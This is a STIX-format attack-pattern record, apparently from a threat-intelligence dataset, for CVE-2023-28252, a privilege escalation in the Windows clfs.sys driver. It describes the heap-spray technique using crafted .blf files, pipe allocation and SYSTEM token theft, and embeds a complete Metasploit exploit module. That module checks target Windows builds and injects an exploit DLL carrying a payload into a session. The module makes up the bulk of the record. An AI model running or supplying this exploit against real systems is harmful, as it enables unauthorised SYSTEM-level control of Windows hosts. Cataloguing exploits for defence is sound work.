{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a33f6b4b-af65-44ca-bc32-d42a853a6ea2",
    "created": "2024-08-14T16:49:32.240774Z",
    "modified": "2024-08-14T16:49:32.240778Z",
    "name": "Windows Common Log File System Driver (clfs.sys) Elevation of Privilege Vulnerability",
    "description": " A privilege escalation vulnerability exists in the clfs.sys driver which comes installed by default on Windows 10 21H2, Windows 11 21H2 and Windows Server 20348 operating systems.  The clfs.sys driver contains a function CreateLogFile that is used to create open and edit '*.blf' (base log format) files. Inside a .blf file there are multiple blocks of data which contain checksums to verify the integrity of the .blf file and to ensure the file looks and acts like a .blf file. However, these files can be edited with CreateFileA or with fopen and then modified with WriteFile or fwrite respectively in order to change the contents of the file and update their checksums accordingly.  This exploit makes use to two different kinds of specially crafted .blf files that are edited using the technique mentioned above. There are multiple spray .blf files. The spray .blf files are specially crafted to initiate an out of bounds read which reads from a contiguous block of memory. The block of memory it reads from contains a read-write pipe that points to the address of the second type of .blf file - the trigger .blf file. The trigger .blf file is specially crafted read the SYSTEM token and write it in the process of the exploit to achieve the local privilege escalation.  The exploits creates a controlled memory space by first looping over the CreatePipe function to to create thousands of read-write pipes (which take up 0x90 bytes of memory). It then releases a certain number of pipes from memory and calls CreateLogFile to open the pre-existing spray .blf files which when being opened fill the 0x90 byte gaps created by the deallocation of the pipes in memory, creating the controlled memory space.  This is a very brief and high overview description of what the exploit is actually doing. For a more detailed and in",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2023_28252_clfs_driver.rb",
            "external_id": "cve_2023_28252_clfs_driver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28252"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/fortra/CVE-2023-28252"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Windows::Version\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows Common Log File System Driver (clfs.sys) Elevation of Privilege Vulnerability',\n          'Description' => %q{\n            A privilege escalation vulnerability exists in the clfs.sys driver which comes installed by default on\n            Windows 10 21H2, Windows 11 21H2 and Windows Server 20348 operating systems.\n\n            The clfs.sys driver contains a function CreateLogFile that is used to create\n            open and edit '*.blf' (base log format) files. Inside a .blf file there are multiple blocks of data which\n            contain checksums to verify the integrity of the .blf file and to ensure the file looks and acts like a\n            .blf file. However, these files can be edited with CreateFileA or with fopen and then modified with\n            WriteFile or fwrite respectively in order to change the contents of the file and update their checksums accordingly.\n\n            This exploit makes use to two different kinds of specially crafted .blf files that are edited using the technique\n            mentioned above. There are multiple spray .blf files. The spray .blf files are specially crafted to initiate an out of\n            bounds read which reads from a contiguous block of memory. The block of memory it reads from contains a read-write pipe\n            that points to the address of the second type of .blf file - the trigger .blf file. The trigger .blf file is specially\n            crafted read the SYSTEM token and write it in the process of the exploit to achieve the local privilege escalation.\n\n            The exploits creates a controlled memory space by first looping over the CreatePipe function to\n            to create thousands of read-write pipes (which take up 0x90 bytes of memory). It then releases a certain number of\n            pipes from memory and calls CreateLogFile to open the pre-existing spray .blf files which when being opened fill the\n            0x90 byte gaps created by the deallocation of the pipes in memory, creating the controlled memory space.\n\n            This is a very brief and high overview description of what the exploit is actually doing. For a more detailed and in\n            depth analysis please refer to the following [reference](https://github.com/fortra/CVE-2023-28252).\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Ricardo Narvaja',    # Original PoC (@ricnar456)\n            'Esteban.kazimirow',  # Original PoC (@solidclt)\n            'jheysel-r7'          # msf module\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n          ],\n          'References' => [\n            [ 'CVE', '2023-28252' ],\n            [ 'URL', 'https://github.com/fortra/CVE-2023-28252' ]\n          ],\n          'DisclosureDate' => '2023-04-11',\n          'DefaultTarget' => 0,\n          'Privileged' => true,\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [UNRELIABLE_SESSION], # Should always return a session on the first run but after that a session is not guaranteed\n            'SideEffects' => []\n          },\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      # Non-Windows systems are definitely not affected.\n      return Exploit::CheckCode::Safe\n    end\n\n    file_path = get_env('WINDIR') + '\\\\system32\\\\drivers\\\\clfs.sys'\n    unless file?(file_path)\n      return Exploit::CheckCode::Safe('The target system does not have clfs.sys in system32\\\\drivers\\\\')\n    end\n\n    version = get_version_info\n    if version.build_number.between?(Msf::WindowsVersion::Win10_20H2, Msf::WindowsVersion::Win10_21H2) || version.build_number == Msf::WindowsVersion::Win11_21H2 || version.build_number == Msf::WindowsVersion::Server2022\n      return CheckCode::Appears(\"The target is running windows version: #{version.build_number} which has a vulnerable version of clfs.sys installed by default\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')\n    elsif sysinfo['Architecture'] == ARCH_X64 && target.arch.first == ARCH_X86\n      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')\n    elsif sysinfo['Architecture'] == ARCH_X86 && target.arch.first == ARCH_X64\n      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')\n    end\n\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-28252', 'CVE-2023-28252.x64.dll'),\n      [encoded_payload.length].pack('I<') + encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}